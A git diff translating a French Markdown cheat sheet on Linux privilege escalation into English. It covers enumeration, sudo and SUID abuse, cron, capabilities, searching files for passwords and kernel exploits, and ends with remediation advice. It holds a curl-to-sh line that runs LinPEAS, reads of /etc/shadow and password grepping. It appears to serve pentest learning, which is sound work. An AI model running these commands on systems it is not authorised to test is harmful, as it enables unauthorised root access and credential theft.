@@ -9,49 +9,49 @@ last_updated: 2024-01-01
 
 ## 📖 Description
 
-> Techniques permettant de passer d'un accès utilisateur standard à root sur un système Linux.
+> Techniques to move from standard user access to root on a Linux system.
 
 ---
 
-## 🔍 Énumération (toujours commencer par là)
+## 🔍 Enumeration (always start here)
 
 ```bash
-# Infos système
+# System info
 uname -a
 cat /etc/os-release
 id && whoami
 
-# Utilisateurs
+# Users
 cat /etc/passwd
-cat /etc/shadow  (si lisible)
+cat /etc/shadow  (if readable)
 
-# Automatisé — LinPEAS (le plus complet)
+# Automated — LinPEAS (most comprehensive)
 curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
 
-# Automatisé — LinEnum
+# Automated — LinEnum
 ./LinEnum.sh
 ```
 
 ---
 
-## 💥 Vecteurs courants
+## 💥 Common Vectors
 
 ### 1. Sudo misconfiguration
 
 ```bash
-sudo -l   # Lister les droits sudo
+sudo -l   # List sudo rights
 
-# Si on peut lancer vim en sudo
+# If we can run vim as sudo
 sudo vim -c ':!/bin/bash'
 
-# GTFOBins — liste des binaires exploitables
+# GTFOBins — list of exploitable binaries
 # https://gtfobins.github.io/
 ```
 
 ### 2. SUID / SGID binaries
 
 ```bash
-# Trouver les binaires SUID
+# Find SUID binaries
 find / -perm -4000 -type f 2>/dev/null
 find / -perm -u=s -type f 2>/dev/null
 ```
@@ -61,17 +61,17 @@ find / -perm -u=s -type f 2>/dev/null
 ```bash
 cat /etc/crontab
 ls -la /etc/cron*
-# Chercher des scripts writables exécutés par root
+# Look for writable scripts executed by root
 ```
 
 ### 4. Capabilities
 
 ```bash
 getcap -r / 2>/dev/null
-# python3 avec cap_setuid → root possible
+# python3 with cap_setuid → root possible
 ```
 
-### 5. Mot de passe dans fichiers
+### 5. Passwords in files
 
 ```bash
 find / -name "*.conf" -readable 2>/dev/null | xargs grep -l "password"
@@ -82,24 +82,24 @@ history
 ### 6. Kernel exploits
 
 ```bash
-uname -r   # Version du kernel
-# Chercher CVE correspondants sur exploit-db
+uname -r   # Kernel version
+# Search for matching CVEs on exploit-db
 searchsploit linux kernel 5.4
 ```
 
 ---
 
-## 🛡️ Remédiation
+## 🛡️ Remediation
 
-- Audit régulier des droits sudo (`/etc/sudoers`)
-- Supprimer le bit SUID des binaires non nécessaires
-- Sécuriser les scripts de cron (owner root, droits 700)
-- Mise à jour régulière du kernel
+- Regularly audit sudo rights (`/etc/sudoers`)
+- Remove SUID bit from unnecessary binaries
+- Secure cron scripts (owner root, permissions 700)
+- Regular kernel updates
 
 ---
 
-## 🔗 Ressources
+## 🔗 Resources
 
-- [GTFOBins](https://gtfobins.github.io/) ← indispensable
+- [GTFOBins](https://gtfobins.github.io/) ← essential
 - [PayloadsAllTheThings — PrivEsc Linux](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
 - [HackTricks — Linux PrivEsc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
